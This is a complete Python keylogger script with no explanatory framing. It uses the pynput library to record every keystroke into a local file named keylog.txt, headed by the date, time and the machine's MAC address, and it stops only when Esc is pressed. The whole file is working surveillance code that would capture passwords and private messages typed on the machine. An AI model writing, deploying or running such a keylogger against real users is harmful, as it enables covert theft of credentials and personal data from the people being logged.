from pynput.keyboard import Key, Listener
from datetime import datetime
from getmac import get_mac_address

# File to store the keystrokes
log_file = "keylog.txt"

# Function to get current date and time
def get_current_datetime():
    return datetime.now().strftime("%d-%m-%Y %H:%M:%S")

# Function to get MAC address
def get_mac():
    return get_mac_address()

# Log the date, time, and MAC address at the beginning
with open(log_file, "a") as f:
    f.write(f"\nDate: {get_current_datetime()}\n")
    f.write(f"MAC Address: {get_mac()}\n")
    f.write("Keystrokes:\n")

def on_press(key):
    try:
        with open(log_file, "a") as f:
            f.write(str(key.char))
    except AttributeError:
        with open(log_file, "a") as f:
            f.write(f" {str(key)} ")

def on_release(key):
    if key == Key.esc:
        # Stop listener
        return False

# Start listening to the keyboard events
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
